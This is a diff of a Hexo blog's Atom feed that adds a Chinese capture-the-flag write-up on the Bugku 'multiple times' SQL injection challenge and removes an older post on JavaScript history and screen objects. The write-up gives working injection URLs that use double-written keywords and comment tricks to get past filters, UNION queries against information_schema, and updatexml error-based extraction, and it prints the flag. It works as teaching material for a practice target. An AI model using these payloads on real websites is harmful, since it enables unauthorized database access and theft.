@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://lzwgiter.github.io/"/>
-  <updated>2018-12-06T10:56:51.293Z</updated>
+  <updated>2018-12-10T09:56:50.006Z</updated>
   <id>http://lzwgiter.github.io/</id>
   
   <author>
@@ -15,6 +15,29 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Bugku的一道注入---多次</title>
+    <link href="http://lzwgiter.github.io/Bugku%E7%9A%84%E4%B8%80%E9%81%93%E6%B3%A8%E5%85%A5---%E5%A4%9A%E6%AC%A1/"/>
+    <id>http://lzwgiter.github.io/Bugku的一道注入---多次/</id>
+    <published>2018-12-10T09:01:08.000Z</published>
+    <updated>2018-12-10T09:56:50.006Z</updated>
+    
+    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p>继续补sqli的题<br>　　<br><a id="more"></a></p></blockquote><p>　　这道题与之前的题的区别是在第二部分中加了一道waf，所以需要特殊的手段来进行注入。<br>　　题目来源:<a href="http://123.206.87.240:9004/1ndex.php?id=1" target="_blank" rel="noopener">http://123.206.87.240:9004/1ndex.php?id=1</a>　　</p><h3 id="第一部分"><a href="#第一部分" class="headerlink" title="第一部分"></a>第一部分</h3><p>　　通过改变id值我们可以看页面内容的变化。5时提醒可以注入，6以后开始报error：<br>　　<img src="/img/Bugku的一道注入---多次/1.png" alt=""><br>　　<img src="/img/Bugku的一道注入---多次/2.png" alt=""><br>　　构造1：<br>　　<code>http://123.206.87.240:9004/1ndex.php?id=1%27%20and%201=1%23</code>报错<br>　　构造2:<br>　　<code>http://123.206.87.240:9004/1ndex.php?id=1%27%20or%201=1%23</code>报错<br>　　考虑是过滤了关键词，尝试使用双写绕过：<br>　　构造3:<br>　　<code>http://123.206.87.240:9004/1ndex.php?id=1%27%20anandd%201=1%23</code><br>　　返回正常。<br>　　<img src="/img/Bugku的一道注入---多次/3.png" alt=""><br>　　<br>　　判断字段数：<br>　　<code>http://123.206.87.240:9004/1ndex.php?id=1%27%20oorrder%20by%202%23</code><br>　　order by 2时返回正常，说明有两个字段。（注意过滤了or关键词，所以order写作oorrder）<br>　　<br>　　判断回显点：<br>　　<code>http://123.206.87.240:9004/1ndex.php?id=-1&#39; uniunionon selselectect 1,2%23</code><br>　　<img src="/img/Bugku的一道注入---多次/4.png" alt=""><br>　　<br>　　查看当前数据库：<br>　　<code>http://123.206.87.240:9004/1ndex.php?id=-1&#39; uniunionon selselectect 1,database()%23</code><br>　　<img src="/img/Bugku的一道注入---多次/5.png" alt=""><br>　　<br>　　查询该库中所有表：<br>　　<code>http://123.206.87.240:9004/1ndex.php?id=-1&#39; uniunionon selselectect 1,(selselectect group_concat(table_name) from infoorrmation_schema.tables where table_schema=database())%23</code><br>　　（注意：information中or要双写：infoorrmation)<br>　　<img src="/img/Bugku的一道注入---多次/6.png" alt=""><br>　　<br>　　该库中有两个表，hint表中储存的就是我们改变id值看到的提示。查看flag1表中字段数：<br>　　<code>http://123.206.87.240:9004/1ndex.php?id=-1&#39; uniunionon selselectect 1,(selselectect group_concat(column_name) from infoorrmation_schema.columns where table_name=&#39;flag1&#39;)%23</code><br>　　<img src="/img/Bugku的一道注入---多次/7.png" alt=""><br>　　该表中有两个字段：flag1和address<br>　　<br>　　查看flag1字段值：<br>　　<code>http://123.206.87.240:9004/1ndex.php?id=-1&#39; uniunionon selselectect 1,(selselectect group_concat(flag1) from flag1)%23</code><br>　　<img src="/img/Bugku的一道注入---多次/8.png" alt=""><br>　　<br>　　查看address值：<br>　　<code>http://123.206.87.240:9004/1ndex.php?id=-1&#39; uniunionon selselectect 1,(selselectect group_concat(address) from flag1)%23</code><br>　　<img src="/img/Bugku的一道注入---多次/9.png" alt=""><br>　　进入下一关。　　</p><h3 id="第二部分"><a href="#第二部分" class="headerlink" title="第二部分"></a>第二部分</h3><p>　　第一关主要是union注入加上双写绕过，难度不大，这里就有难度了。<br>　　<img src="/img/Bugku的一道注入---多次/10.png" alt=""><br>　　构造：<br>　　<code>http://123.206.87.240:9004/Once_More.php?id=%27</code><br>　　返回值：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">　　You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;&apos;&apos;&apos;&apos; at line 1</span><br></pre></td></tr></table></figure></p><p>　　确定注入点，加上双写绕过试试<br>　　构造：<br>　　<code>http://123.206.87.240:9004/Once_More.php?id=1%27%20anandd%201=1%23</code><br>　　返回值：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;anandd 1=1#&apos;&apos; at line 1</span><br></pre></td></tr></table></figure></p><p>　　仍有过滤，尝试用/<strong>/代替空格，不加双写：<br>　　构造：<br>　　`<a href="http://123.206.87.240:9004/Once_More.php?id=1%27/" target="_blank" rel="noopener">http://123.206.87.240:9004/Once_More.php?id=1%27/</a></strong>/and/<strong>/1=1%23<code>返回正常：　　![](/img/Bugku的一道注入---多次/11.png)　　　　判断字段数：　　构造：</code><a href="http://123.206.87.240:9004/Once_More.php?id=1%27/" target="_blank" rel="noopener">http://123.206.87.240:9004/Once_More.php?id=1%27/</a></strong>/order/<strong>/by/</strong>/3%23<code>![](/img/Bugku的一道注入---多次/12.png)　　共有两个字段。　　　　判断回显点：</code><a href="http://123.206.87.240:9004/Once_More.php?id=-1%27/**/union/**/select/**/1,2%23`" target="_blank" rel="noopener">http://123.206.87.240:9004/Once_More.php?id=-1%27/**/union/**/select/**/1,2%23`</a><br>　　报错：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;select/**/1,2#&apos;&apos; at line 1</span><br></pre></td></tr></table></figure></p><p>　　<img src="/img/Bugku的一道注入---多次/13.png" alt=""><br>　　GG，过滤了union。尝试大小写绕过，双写绕过，内联注释<code>/*!*/</code>绕过。然而统统GG。放弃union注入。<br>　　<br>　　但是他有报错，我们可以利用这个特点。这里用<strong>updatexml函数报错</strong>的方法来注入。<br>　　<br>　　构造：<br>　　<code>http://120.24.86.145:9004/Once_More.php?id=1&#39; and updatexml(1,concat(&#39;~&#39;,(select group_concat(table_name) from information_schema.tables where table_schema=database()),&#39;~&#39;),3) %23</code><br>　　<img src="/img/Bugku的一道注入---多次/14.png" alt=""><br>　　当前表名为flag2。<br>　　<br>　　构造：<br>　　<code>http://123.206.87.240:9004/Once_More.php?id=1%27%20and%20updatexml(1,concat(%27~%27,(select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_schema=database()%20and%20table_name=%27flag2%27),%27~%27),3)%20%23#</code><br>　　<img src="/img/Bugku的一道注入---多次/15.png" alt=""><br>　　当前表中有两个字段:flag2和address。<br>　　<br>　　查看flag2字段值：<br>　　构造：<br>　　<code>http://123.206.87.240:9004/Once_More.php?id=?id=1%27%20and%20updatexml(1,concat(%27~%27,(select%20flag2%20from%20flag2),%27~%27),3)%20%23</code><br>　　<img src="/img/Bugku的一道注入---多次/16.png" alt=""><br>　　得flag:flag{Bugku-sql_6s-2i-4t-bug}<br>　　<br>　　另外这个题也是可以用盲注解决的。　　</p><h3 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml"></a>updatexml</h3><p>　　updatexml函数格式:<strong>UPDATEXML (XML_document, XPath_string, new_value);</strong><br>　　1. 第一个参数：XML_document是String格式，为XML文档对象的名称。<br>　　2. 第二个参数：XPath_string (Xpath格式的字符串)<br>　　3. 第三个参数：new_value，String格式，替换查找到的符合条件的数据<br>　　4. 函数作用：改变文档中符合条件的节点的值</p><p>　　用该函数注入时需要结合concat()函数，因为concat连出来的字符串不符合XPath_String的格式，所以会报错。　　　　　　</p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;blockquote&gt;
+&lt;p&gt;继续补sqli的题&lt;br&gt;　　&lt;br&gt;&lt;/p&gt;&lt;/blockquote&gt;
+    
+    </summary>
+    
+    
+      <category term="Bugku" scheme="http://lzwgiter.github.io/tags/Bugku/"/>
+    
+      <category term="SQLi" scheme="http://lzwgiter.github.io/tags/SQLi/"/>
+    
+  </entry>
   
   <entry>
     <title>Bugku的一道注入--INSERT INTO注入</title>
@@ -452,28 +475,6 @@
       <category term="Javascript" scheme="http://lzwgiter.github.io/tags/Javascript/"/>
     
       <category term="DOM" scheme="http://lzwgiter.github.io/tags/DOM/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>BOM-浏览器操作对象模型之history和screen对象</title>
-    <link href="http://lzwgiter.github.io/BOM-%E6%B5%8F%E8%A7%88%E5%99%A8%E6%93%8D%E4%BD%9C%E5%AF%B9%E8%B1%A1%E6%A8%A1%E5%9E%8B%E4%B9%8Bhistory%E5%92%8Cscreen%E5%AF%B9%E8%B1%A1/"/>
-    <id>http://lzwgiter.github.io/BOM-浏览器操作对象模型之history和screen对象/</id>
-    <published>2018-08-21T05:42:36.000Z</published>
-    <updated>2018-08-21T09:26:11.817Z</updated>
-    
-    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p>emmmmm今天把剩下的两个Browser对象搞定</p></blockquote><a id="more"></a><h3 id="history对象"><a href="#history对象" class="headerlink" title="history对象"></a>history对象</h3><p>　　history对象储存浏览器窗口的浏览历史，通过window对象的history属性可以访问该对象，其储存的是最近访问的、有限条目的URL信息。为了保护客户端浏览信息的隐私性，history对象机制脚本直接操作访问这些信息。<br>　　其方法如下：<br>　　<img src="/img/BOM-浏览器操作对象模型之history和screen对象/1.png" alt=""><br>　　其属性只有一个，<code>length</code>，该属性可读取列表中的URL个数，并可以调用以上的方法来访问数组中的URL。具体如下。<br>　　1. back()：返回前一个URL。<br>　　2. forward()：访问下一个URL。<br>　　3. go()：可根据参数决定访问的URL:<br>　　　　1. 如果参数为正整数，就在历史列表中向前移动；负整数就向后移动，0为刷新。<br>　　　　2. 如果一个参数字符串，则该对象可在浏览历史中检索包含该字符串的URL，并访问第一个。　　</p><h3 id="screen对象"><a href="#screen对象" class="headerlink" title="screen对象"></a>screen对象</h3><p>　　screen对象储存客户端屏幕信息，可以用来探测客户端硬件的基本配置，该对象可用于优化程序的设计，满足不同用户的显示要求。<br>　　<img src="/img/BOM-浏览器操作对象模型之history和screen对象/2.png" alt=""><br>　　比如让一个弹出窗口居中显示：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">center</span>(<span class="params">url</span>)</span>&#123; <span class="comment">// 窗口居中处理函数</span></span><br><span class="line">    <span class="keyword">var</span> w = screen.availWidth / <span class="number">2</span>; <span class="comment">// 获取客户端屏幕的宽度一半</span></span><br><span class="line">    <span class="keyword">var</span> h = screen.availHeight / <span class="number">2</span>; <span class="comment">// 获取客户端屏幕的高度一半</span></span><br><span class="line">    <span class="keyword">var</span> t = (screen.availHeight - h)/<span class="number">2</span>; <span class="comment">// 计算居中显示时顶部坐标</span></span><br><span class="line">    <span class="keyword">var</span> l = (screen.availWidth - w)/<span class="number">2</span>; <span class="comment">// 计算居中显示时左侧坐标</span></span><br><span class="line">    <span class="keyword">var</span> p = <span class="string">"top="</span> + t + <span class="string">",left="</span> + l + <span class="string">",width="</span> + w + <span class="string">",height="</span> + h; </span><br><span class="line"><span class="comment">// 设计坐标参数字符串</span></span><br><span class="line">    <span class="keyword">var</span> win = <span class="built_in">window</span>.open(url,<span class="string">"url"</span>,p); <span class="comment">// 打开指定的窗口，并传递参数</span></span><br><span class="line">    win.focus();<span class="comment">// 获取窗口焦点</span></span><br><span class="line">&#125;</span><br><span class="line">center(<span class="string">"https://www.baidu.com/"</span>);<span class="comment">// 调用该函数</span></span><br></pre></td></tr></table></figure></p><p>　　</p>]]></content>
-    
-    <summary type="html">
-    
-      &lt;blockquote&gt;
-&lt;p&gt;emmmmm今天把剩下的两个Browser对象搞定&lt;/p&gt;
-&lt;/blockquote&gt;
-    
-    </summary>
-    
-    
-      <category term="Javascript" scheme="http://lzwgiter.github.io/tags/Javascript/"/>
     
   </entry>
   
